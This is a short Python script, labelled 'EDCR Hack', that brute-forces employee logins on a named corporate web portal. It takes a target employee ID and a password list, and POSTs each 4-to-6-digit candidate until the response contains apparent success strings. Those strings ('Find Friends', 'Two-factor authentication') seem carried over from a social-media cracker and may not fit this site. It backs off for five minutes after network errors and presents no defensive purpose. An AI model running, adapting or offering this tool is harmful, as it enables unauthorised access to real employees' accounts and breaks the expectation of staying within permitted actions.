import time
import sys
import requests
from bs4 import BeautifulSoup

# Check Python version
if sys.version_info[0] != 3:
    print('''--------------------------------------
    REQUIRED PYTHON 3.x
    use: python3 EDCR.py
                        By Mostafijur Rahhamn
--------------------------------------
    ''')
    sys.exit()

# Target URL and headers
post_url = "https://edcr.squaregroup.com/"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

print('\n---------- EDCR Hack by Moxaclav ----------\n')

# Read passwords from file
try:
    with open('passwords.txt', 'r') as file:
        passwords = file.readlines()
except FileNotFoundError:
    print("Error: 'passwords.txt' file not found.")
    sys.exit()

# Get user input for email/ID
email = input('Enter ID: ').strip()
print("\nTarget Employee ID:", email)
print("\nTrying Passwords from list...")

# Initialize session
session = requests.Session()
session.headers.update(headers)

# Loop through passwords
for i, passw in enumerate(passwords, start=1):
    passw = passw.strip()

    # Skip passwords that are not 4 to 6 digits long
    if len(passw) < 4 or len(passw) > 6:
        continue

    print(f"{i} : {passw}")

    try:
        # Send POST request with email and password
        payload = {
            'email': email,
            'pass': passw,
        }
        response = session.post(post_url, data=payload)
        response_data = response.text

        # Check for success indicators in the response
        if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
            print('Your password is:', passw)
            break

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        print("\nSleeping for 5 minutes...\n")
        time.sleep(300)

print("\nPassword cracking process completed.")